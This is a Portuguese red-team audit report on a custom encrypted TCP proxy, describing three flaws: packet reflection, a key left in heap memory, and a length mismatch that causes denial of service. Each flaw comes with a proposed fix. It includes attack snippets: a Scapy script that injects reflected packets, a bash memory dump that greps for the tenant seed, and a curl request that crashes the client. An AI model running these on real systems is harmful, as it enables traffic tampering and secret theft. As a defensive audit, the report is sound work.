# 🔴 CROM-SEC: Relatório Oficial de Red Team (Engulf)

**Data da Operação:** Abril 2026
**Alvo:** `simulators/dropin_tcp/proxy_universal_out.go` & `pkg/crommobile/client.go`
**Estado:** COMPROMETIDO (0-Day Exploration)

Abaixo estão as 3 vulnerabilidades críticas encontradas na auditoria de segurança da arquitetura CROM-SEC Gen-6. O sistema foi analisado friamente. Suas defesas falharam sistematicamente contra métodos cirúrgicos nas camadas de Criptografia, Memória e Rede.

---

## 1. 🛡️ VULN-1: Crypto Reflection & AAD Blindness (Criptografia) - CVSS 9.8

### O Diagnóstico
O sistema utiliza uma mesma chave estática (`HMAC(TenantSeed)`) para **ambas as direções** do túnel (Alpha -> Omega, e Omega -> Alpha).
O protocolo de pacote define o GCM Additional Authenticated Data (AAD) como `[MAGIC 4B][TIMESTAMP 8B]`. 
**Falha crítica:** Nenhuma das partes valida *de onde* o pacote veio. Um atacante que realize Person-in-the-Middle (MitM) pode capturar um pacote criptografado emitido pelo servidor (Omega) para o Alpha, e injetá-lo **de volta no Omega**. O Omega aceitará o pacote como originário do Alpha, descriptografará, e introduzirá no backend. O sistema anti-replay não impede isso, pois o Omega apenas cataloga Nonces do cliente, e esse Nonce foi gerado por ele mesmo (Omega).

### Exploit Code (Python / Scapy)
```python
# Exploit: Reflexão Cega contra CROM-SEC
from scapy.all import *

def reflect_packet(pkt):
    # Intercepta tráfego saindo da porta 9999 (Server/Omega -> Alpha)
    if pkt.haslayer(TCP) and pkt[TCP].sport == 9999 and len(pkt[TCP].payload) > 42:
        print("[!] Capturado pacote do servidor. Refletindo de volta para o servidor...")
        # Clona o pacote, inverte source/destination, atualiza checksums 
        reflected = IP(src=pkt[IP].dst, dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="PA", seq=pkt[TCP].ack, ack=pkt[TCP].seq) / custom_payload(pkt[TCP].payload)
        send(reflected)

sniff(filter="tcp and port 9999", prn=reflect_packet)
```

### Correção Proposta
Implementar derivação direcional estrita. Derivar do HMAC duas chaves filhas: `CLIENT_TX_KEY` e `SERVER_TX_KEY`. Ou, mais simples, modificar a sintaxe para o AAD incluir uma flag de rota (ex: `[]byte("C")` para cliente e `[]byte("S")` para servidor).

---

## 2. 🧠 VULN-2: Heap GC Residue & In-Memory Zeroize Fail (Memória) - CVSS 8.5

### O Diagnóstico
No Omega (`proxy_universal_out.go`), na função `secureReadSeedAndInitAEAD`, há uma falsa sensação de segurança. Você usa `Zeroize` no buffer base e na variável local. Porém:
```go
for _, b := range seedBytes {
    if b >= 32 && b <= 126 {
        trimmed = append(trimmed, b) 
    }
}
```
Em rotinas Go nativas, a função `append` causa **realocação dinâmica**. Se a chave exigir que a slice expanda de capacidade (ex: 8 -> 16 -> 32 bytes), novos arrays são criados no Heap, e os arrays antigos ficam intocados, contendo fragmentos e cópias intactas da `TenantSeed`. Como o Garbage Collector não zera a memória durante a varredura, um dump de memória revelará a semente.

### Exploit Code (Bash - Dump Extraction)
```bash
#!/bin/bash
# Requer Root para extrair /proc/PID/mem
PID=$(pgrep -f proxy_out)
gcore -o proxy_dump $PID
# Devido ao vazamento por realocação do Go append(), a chave brilha em plaintext:
strings proxy_dump | grep "CROM-SEC-TENANT"
```

### Correção Proposta
O Go não possui garantias estritas de proteção de RAM em slices dinâmicos. Alocar o tamanho exato da array primeiramente para proibir crescimento da capacidade:
```go
var validCount int
for _, b := range seedBytes {
    if b >= 32 && b <= 126 { validCount++ }
}
trimmed := make([]byte, 0, validCount)
for _, b := range seedBytes {
    if b >= 32 && b <= 126 { trimmed = append(trimmed, b) }
}
```

---

## 3. 🕸️ VULN-3: Self-DoS Gen-6 Framework Length OOB (Rede / Arquitetura) - CVSS 7.2

### O Diagnóstico
Em `proxy_universal_out.go`, a Goroutine de leitura do backend tem o limite `make([]byte, 32768)`. O proxy vai ler gloriosamente atŕ 32768 bytes do Backend. Em seguida, injetará os 40 bytes de overhead criptográfico gerando um pacote criptografado total de comprimento **32808**.
Durante a transmissão (`writeFramedPacket`), a rede joga isso no prefixo `uint16(32808)`.
Do outro lado (Alpha), o método obrigatório `readFramedPacket` implementa:
`if packetLen > 32768 { return fmt.Errorf("length buffer oversize attack") }`.
Consequentemente, tráfego web normal com um `Content-Length` robusto > 32728 bytes quebra o protocolo instantaneamente por conflito de tamanho estrutural entre a Criptografia e a Rede de Transportes, tornando-se Auto-Denial of Service não intencional irreversível.

### Exploit Code (Bash / Curl)
Um mero atacante solicitando uma página estática ligeiramente longa derruba a si ou aos outros.
```bash
# Se o backend de destino suportar payloads grandes
curl -X POST "http://127.0.0.1:5432" -d "$(dd if=/dev/urandom bs=1 count=32768 2>/dev/null)"
# Resultado: Alpha Client panica ("length buffer oversize attack"), encerra a stream prematuramente.
```

### Correção Proposta
Sincronizar a Constant Constraint.
Permitir na recepção o tamanho em L7 + L4 Crypto Overhead Limits:
Em `readFramedPacket`:
`if packetLen > 33000 { ... }` 
Ou restringir a leitura do buffer do backend (`backendConn.Read`) à sub-porção segura: `make([]byte, 32768 - 40)`.
